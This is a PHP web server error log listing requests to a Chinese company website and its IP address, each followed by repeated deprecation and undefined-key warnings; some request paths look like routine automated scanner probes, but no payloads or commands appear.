[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T20:47:53+08:00 ] 118.31.188.56 GET 120.24.147.77/HNAP1
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T20:47:53+08:00 ] 118.31.188.56 GET 120.24.147.77/evox/about
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T20:47:53+08:00 ] 118.31.188.56 GET 120.24.147.77/evox/about
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T20:48:13+08:00 ] 118.31.188.56 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T20:48:13+08:00 ] 118.31.188.56 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T20:48:14+08:00 ] 118.31.188.56 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T20:48:20+08:00 ] 52.167.144.236 GET www.punalei.cn/ldcms/jiaozhiliudianyuanxilie.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T20:55:51+08:00 ] 52.167.144.236 GET www.punalei.cn/ldcms/jiaoliubianpindianyuan.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:06+08:00 ] 195.170.172.128 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:00:08+08:00 ] 195.170.172.128 POST 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:00:11+08:00 ] 195.170.172.128 POST 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:00:14+08:00 ] 195.170.172.128 GET 120.24.147.77/WuEL
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:14+08:00 ] 195.170.172.128 GET 120.24.147.77/WuEL
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:22+08:00 ] 195.170.172.128 GET 120.24.147.77/a
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:22+08:00 ] 195.170.172.128 GET 120.24.147.77/a
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:24+08:00 ] 195.170.172.128 GET 120.24.147.77/download/file.ext
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:24+08:00 ] 195.170.172.128 GET 120.24.147.77/download/file.ext
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:27+08:00 ] 195.170.172.128 GET 120.24.147.77/SiteLoader
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:27+08:00 ] 195.170.172.128 GET 120.24.147.77/SiteLoader
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:29+08:00 ] 195.170.172.128 GET 120.24.147.77/mPlayer
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:29+08:00 ] 195.170.172.128 GET 120.24.147.77/mPlayer
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:00:44+08:00 ] 195.170.172.128 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:08:33+08:00 ] 47.102.184.31 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:29:14+08:00 ] 27.21.28.16 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:29:14+08:00 ] 27.21.28.16 GET www.punalei.cn/ldcms/lianxiwomen.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:29:14+08:00 ] 27.21.28.16 GET www.punalei.cn/lianxiwomen.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:29:14+08:00 ] 27.21.28.16 GET www.punalei.cn/lianxiwomen.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:32:49+08:00 ] 39.105.185.176 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:33:00+08:00 ] 82.156.135.226 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:39:34+08:00 ] 121.41.165.24 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:42:20+08:00 ] 34.79.177.120 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:46:05+08:00 ] 66.132.153.125 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:46:12+08:00 ] 66.132.153.125 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:46:12+08:00 ] 66.132.153.125 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:46:24+08:00 ] 52.167.144.183 GET www.punalei.cn/ldcms/ceshi/325.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:46:26+08:00 ] 66.132.153.125 GET 120.24.147.77/security.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:46:26+08:00 ] 66.132.153.125 GET 120.24.147.77/security.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:46:42+08:00 ] 85.217.149.70 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T21:46:59+08:00 ] 5.61.209.96 GET 120.24.147.77/SDK/webLanguage
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T21:46:59+08:00 ] 5.61.209.96 GET 120.24.147.77/SDK/webLanguage
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
